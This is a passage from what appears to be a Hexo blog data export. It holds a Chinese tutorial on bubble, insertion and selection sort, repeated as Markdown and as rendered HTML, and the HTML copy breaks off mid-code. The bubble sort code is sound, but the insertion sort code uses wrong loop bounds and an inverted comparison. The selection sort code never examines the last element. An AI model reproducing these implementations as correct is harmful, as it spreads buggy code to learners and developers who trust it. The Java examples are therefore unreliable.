}\n}\n```\n\n现在结合上面分析算法的三个方面，有三个问题要问你。\n\n**第一、冒泡排序是原地排序算法吗？**\n\n冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。\n\n**第二、冒泡排序是稳定的排序算法吗？**\n\n在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。\n\n**第三、冒泡排序的时间复杂度是多少？**\n\n最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。\n\n最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。\n\n对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过**有序度**和**逆序度**这两个概念来分析。\n\n有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] <= a[j], 如果i < j$。\n\n2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)\n\n同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n\\*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做**满有序度**。\n\n逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] > a[j], 如果i < j$。\n\n关于这三个概念，我们可以得到一个公式：**逆序度 = 满有序度 - 有序度**。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。\n\n我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.\n\n| 冒泡次数 | 冒泡结果 | 有序度|\n|---------|---------|--------------| \n| 初始状态 |4，5，6，3，2，1 |  3  |\n|第一次冒泡|4，5，3，2，1，6 |  6  |\n|第二次冒泡|4，3，2，1，5，6 |  9  |\n|第三次冒泡|3，2，1，4，5，6 | 12  |\n|第四次冒泡|2，1，3，4，5，6 | 14  |\n|第五次冒泡|1，2，3，4，5，6 | 15  |\n\n冒泡排序包含两个原子操作，**比较**和**交换**。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为**逆序度，也就是n\\*(n-1)/2 - 初始有序度**。此例中就是15-3=12，也就是要进行12次交换操作。\n\n对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n\\*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n\\*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。\n\n换句话说，平均情况下需要n\\*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。\n\n这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 插入排序\n{% endnote %}\n</div>\n\n我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。\n\n这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。\n\n那插入排序是如何借助上面的思想来实现排序的呢？\n\n首先，我们将数组中的数据分为两个区间，**已排序区间**和**未排序区间**。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。\n\n如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。\n\n{% asset_img 插入排序过程.jpg %}\n\n插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。\n\n对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。\n\n为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n\\*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。\n\n{% asset_img 插入排序移动次数.jpg %}\n\n插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：\n\n```java\npublic void insertSort(int[] a, int n){\n\tif(n<=1) return;\n\tfor(int i=1;i<n-1;i++){\n\t\tint val = a[i];\n\t\tint j=i-1;\n\t\tfor(;j>0;j--){\n\t\t\tif(a[j]<val){\n\t\t\t\ta[j+1] = a[j];\n\t\t\t}else {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\ta[j+1] = val;\n\t}\n}\n```\n\n现在同样有三个问题。\n\n**第一、插入排序是原地排序算法吗？**\n\n从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。\n\n**第二、插入排序是稳定的排序算法吗？**\n\n在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。\n\n**第三、插入排序的时间复杂度是多少？**\n\n如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是**从尾到头遍历已经有序的数据**。\n\n如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。\n\n还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 选择排序\n{% endnote %}\n</div>\n\n选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。\n\n{% asset_img 选择排序过程.jpg %}\n\n同样，也有三个问题需要你思考。\n\n**第一、插入排序是原地排序算法吗？**\n\n首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。\n\n**第二、插入排序的时间复杂度是多少？**\n\n选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。\n\n**第三、插入排序是稳定的排序算法吗？**\n\n答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。\n\n比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。\n\n```java\npublic void selectSort(int[] a, int n){\n    for(int i=0;i<n-1;i++){\n        for(int j=i+1; j<n-1;j++){\n        \tif(a[j]<a[i]){\n        \t\tint temp = a[j];\n        \t\ta[j] = a[i];\n        \t\ta[i] = temp;\n        \t}\n        }\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？\n\n我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。\n\n但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：\n\n```java\n// 冒泡排序中的数据交换操作\n if(a[j]>a[j+1]){\n    int temp = a[j];\n    a[j] = a[j+1];\n    a[j+1] = temp;\n    flag = true;\n}\n\n// 插入排序中数据移动操作\nif(a[j]<val){\n    a[j+1] = a[j];\n}else {\n    break;\n}\n```\n\n我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。\n\n所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。\n\n|排序算法 | 是否原地排序| 是否稳定|   最好    |   最坏  |   平均  |\n|--------|------------|--------|-----------|---------|---------|\n|冒泡排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|插入排序 |    √       |  √     | $O(n)$  | $O(n^2)$ |$O(n^2)$|\n|选择排序 |    √       |  ×     | $O(n^2)$  | $O(n^2)$ |$O(n^2)$|\n\n这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。\n\n今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n\\*logn)$的排序算法。\n\n### 课后思考\n\n我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(上)","published":1,"updated":"2018-12-05T08:51:39.450Z","_id":"cjpdmv0fn003s4cv04r6yof9v","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。</p>\n<p>排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否基于比较</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上</td>\n<td>冒泡、插入、选择</td>\n<td>$ O(n^2) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>中</td>\n<td>快排、归并</td>\n<td>$ O(nlogN) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>下</td>\n<td>桶、计数、基数</td>\n<td>$ O(n) $</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\"><strong>插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？</strong></font></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何分析一个排序算法\"><a href=\"#如何分析一个排序算法\" class=\"headerlink\" title=\"如何分析一个排序算法\"></a>如何分析一个排序算法</h3></div><br></div>\n\n<p>学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。<strong>那么要分析一个排序算法，要从哪几方面入手呢？</strong></p>\n<h4 id=\"一、-算法的执行效率\"><a href=\"#一、-算法的执行效率\" class=\"headerlink\" title=\"一、 算法的执行效率\"></a>一、 算法的执行效率</h4><p>对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：</p>\n<p><strong>1、最好情况、最坏情况、平均情况时间复杂度</strong></p>\n<p>我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。</p>\n<p>为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。</p>\n<p><strong>2、时间复杂度的系数、常数、低阶</strong></p>\n<p>我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。</p>\n<p><strong>3、比较次数和交换次数</strong></p>\n<p>这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。</p>\n<h4 id=\"二、-算法的内存消耗\"><a href=\"#二、-算法的内存消耗\" class=\"headerlink\" title=\"二、 算法的内存消耗\"></a>二、 算法的内存消耗</h4><p>前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，<strong>原地排序</strong>。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。</p>\n<h4 id=\"三、-排序算法的稳定性\"><a href=\"#三、-排序算法的稳定性\" class=\"headerlink\" title=\"三、 排序算法的稳定性\"></a>三、 排序算法的稳定性</h4><p>仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，<strong>稳定性</strong>。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。</p>\n<p>我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。</p>\n<p>这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做<strong>稳定的排序算法</strong>；如果前后顺序发生变化，那对应的排序算法就叫做<strong>不稳定的排序算法</strong>。</p>\n<p>你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？</p>\n<p>很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。</p>\n<p>比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？</p>\n<p>最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。</p>\n<p>但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？</p>\n<p><strong>稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变</strong>。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3></div><br></div>\n\n<p>我们从冒泡排序开始，学习今天的三种排序算法。</p>\n<p>冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。</p>\n<p>我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序第一次过程.png\">\n<p>可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序过程.jpg\">\n<p>实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>是否有数据交换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>3，5，4，1，2，6</td>\n<td>-</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>3，4，1，2，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>3，1，2，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>无，结束排序操作</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序 a表示需要排序的数组 n表示数组的大小</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;n-<span class=\"number\">1</span>-i;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">                a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">                flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在结合上面分析算法的三个方面，有三个问题要问你。</p>\n<p><strong>第一、冒泡排序是原地排序算法吗？</strong></p>\n<p>冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。</p>\n<p><strong>第二、冒泡排序是稳定的排序算法吗？</strong></p>\n<p>在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。</p>\n<p><strong>第三、冒泡排序的时间复杂度是多少？</strong></p>\n<p>最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。</p>\n<p>最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。</p>\n<p>对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过<strong>有序度</strong>和<strong>逆序度</strong>这两个概念来分析。</p>\n<p>有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。</p>\n<p>2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)</p>\n<p>同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做<strong>满有序度</strong>。</p>\n<p>逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。</p>\n<p>关于这三个概念，我们可以得到一个公式：<strong>逆序度 = 满有序度 - 有序度</strong>。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。</p>\n<p>我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>有序度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>4，5，6，3，2，1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>4，5，3，2，1，6</td>\n<td>6</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>4，3，2，1，5，6</td>\n<td>9</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>3，2，1，4，5，6</td>\n<td>12</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>2，1，3，4，5，6</td>\n<td>14</td>\n</tr>\n<tr>\n<td>第五次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>15</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序包含两个原子操作，<strong>比较</strong>和<strong>交换</strong>。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为<strong>逆序度，也就是n*(n-1)/2 - 初始有序度</strong>。此例中就是15-3=12，也就是要进行12次交换操作。</p>\n<p>对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。</p>\n<p>换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。</p>\n<p>这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3></div><br></div>\n\n<p>我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。</p>\n<p>这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。</p>\n<p>那插入排序是如何借助上面的思想来实现排序的呢？</p>\n<p>首先，我们将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。</p>\n<p>如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序过程.jpg\">\n<p>插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。</p>\n<p>对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。</p>\n<p>为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序移动次数.jpg\">\n<p>插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">insertSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;=<span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> val = a[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> j=i-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(;j&gt;<span class=\"number\">0</span>;j--)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">\t\t\t\ta[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ta[j+<span class=\"number\">1</span>] = val;</span><br><span 